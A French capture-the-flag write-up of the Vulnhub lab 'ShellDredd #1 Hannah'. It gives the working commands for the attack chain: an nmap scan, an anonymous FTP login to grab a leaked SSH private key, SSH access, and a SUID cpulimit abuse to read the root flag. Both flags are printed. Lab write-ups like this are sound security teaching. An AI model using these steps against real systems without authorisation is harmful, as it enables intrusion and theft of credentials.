---
layout: default
title: "Writeup OnSystem: ShellDredd #1 Hannah - Vulnhub"
date:   2020-09-05 03:00:00 +0200
published: true
---

# Informations sur la box :

* **Difficulté** : Facile
* **Description** : *Flag: 2 (user & root). Enumeration & Privilege Escalation. This works better with VirtualBox rather than VMware*
* **Type de fichier** : .ova (VirtualBox)
* **DHCP** : Activé
* **Lien** : [https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/](https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/)


### Ce que nous allons aborder dans ce writeup :

*	[Énumération](#énumération)
* 	[Shell basique](#shell-basique)
*	[Privilege escalation](#privilege-escalation)

* * *

## Énumération
* * *

Cette box est sans doute la box la plus rapide que j'ai faite !

On trouve l'adresse IP de la box à attaquer à l'aide de ``nmap`` :

```bash
nmap -sP 192.168.1.0/24
```

On obtient son adresse IP qui est la suivante : **192.168.1.108**

On scanne ensuite les ports pour trouver ceux qui sont ouverts avec les services qui tournent dessus :

```bash
nmap -sV -p- 192.168.1.108 -O -A --min-rate 5000 -T5
```

* **-sV** : Permet de scanner les services et d'indiquer les versions et les informations correspondantes
* **-p-** : On scan TOUS les ports
* **-O** : Détection de l'OS
* **-A** : Mode aggressif
* **--min-rate 5000** : Définit le nombre d'envoi de paquets par secondes
* **-T5** : Définit le template comme "rapide"

Pour plus d'informations vous pouvez consulter le ``man`` de nmap.

Le résultat est le suivant :

```bash
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (EdDSA)
```

Le scan nous indique qu'il n'y a que deux ports ouverts et pas de serveur web. 

Le serveur **FTP** autorise les **connexion anonymes**. Grâce à ça on est presque sûr que le vecteur d'attaque (ou au moins des informations cruciales) seront récupérables via FTP.

On s'y connecte avec la commande suivante :

```bash
ftp 192.168.1.108
```

On précise l'utilisateur **anonymous** et on laisse le champ du mot de passe vide. On se retrouve connecté sur le FTP !

Un simple ``ls -la`` et on se retrouve avec un dossier nommé **.hannah**. On peut déjà se dire que ce sera potentiellement un utilisateur de la machine.

En se rendant dans ce répertoire on trouve une **clé privée SSH**.

```bash
get .hannah/id_rsa
```

On va l'utiliser pour se connecter au SSH avec l'utilisateur **hannah**. Si jamais une passphrase est nécessaire alors on devra utiliser ``john`` pour la craquer. 

Heureusement pour nous pas besoin de ça !

* * *

## Shell basique

```bash
chmod 600 id_rsa
ssh -i id_rsa hannah@192.168.1.108 -p 61000
```

On peut récupérer le flag utilisateur :

```bash
cat /home/hannah/user.txt
```
```
Gr3mMhbCpuwxCZorqDL3ILPn
```

* * *

## Privilege escalation

On cherche les potentiels binaires avec le **bit SUID** positionné :

```bash
find / -perm -4000 2>/dev/null
```

Deux binaires paraissent intéressant :

```
/usr/bin/mawk
/usr/bin/cpulimit
```

Bizarrement je n'ai pas réussi à exécuter une commande avec ``mawk`` en étant root. Chaque commande était bien exécutée mais en tant que l'utilisateur courant.

Cependant avec le deuxième on peut récupérer le contenu du fichier qui contient le flag du root :

```bash
/usr/bin/cpulimit -l 100 -f cat /root/root.txt
```
```
yeZCB44MPH2KQwbssgTQ2Nof
```

Merci à **d4t4s3c** pour cette box :)